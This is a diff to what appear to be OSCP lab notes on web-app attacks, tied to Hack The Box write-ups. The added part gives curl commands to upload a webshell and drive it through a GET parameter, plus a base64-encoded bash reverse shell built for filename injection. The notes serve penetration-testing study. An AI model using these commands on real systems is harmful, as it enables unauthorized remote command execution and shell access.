@@ -31,6 +31,28 @@ See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Direc
 
 ---
 
+## Multipart upload and GET-controlled command delivery
+
+Keep multipart filenames explicit when testing an upload handler. Use `--data-urlencode` for a webshell whose command comes from `$_GET`, and use `-G` so the command is sent as one query parameter.
+
+```bash
+curl -sS -i -X POST "http://$BoxIP/$UploadPath" \
+  -F "myFile=@$File;filename=$Filename" \
+  -F 'submit=go!'
+curl -sS -G --data-urlencode "cmd=$Command" "http://$BoxIP/$UploadedPath"
+```
+
+For an asynchronous filename injection, encode the callback command before placing it in a filename or other shell-parsed field:
+
+```bash
+EncodedPayload=$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$LocalIP" "$Port" | base64 -w0)
+printf '%s\n' "$EncodedPayload"
+```
+
+See [[OSCP/BOXES/WRITE UPS/Linux/Networked|HTB Networked]].
+
+For a disclosed multi-line backup, save the raw response and decode it in a loop rather than hand-copying the value. See [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]].
+
 ## Python HTTP Server
 
 ```bash
@@ -65,3 +87,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- multipart upload delivery, URL-encoded GET commands, and encoded callback staging
